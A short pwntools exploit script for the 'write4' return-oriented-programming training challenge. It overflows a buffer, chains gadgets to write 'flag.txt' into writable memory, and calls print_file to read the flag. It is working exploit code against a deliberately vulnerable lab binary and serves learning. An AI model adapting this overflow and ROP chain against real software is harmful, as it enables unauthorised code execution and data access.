#!/usr/bin/python 
from pwn import *

p = process("./write4")
elf = ELF("./write4")
libc = ELF("./libwrite4.so")
mov_r14_r15 = 0x400628
pop_r14_r15 = 0x00400690
writable = 0x601050
p1ret = 0x00400693
flag = "flag.txt"
pay = 'A'*(0x20+0x8)
pay += p64(pop_r14_r15) + p64(writable) + flag
pay += p64(mov_r14_r15)
pay += p64(p1ret) + p64(writable) + p64(elf.plt['print_file'])

gdb.attach(p)
p.sendlineafter("> ", pay)


p.interactive()
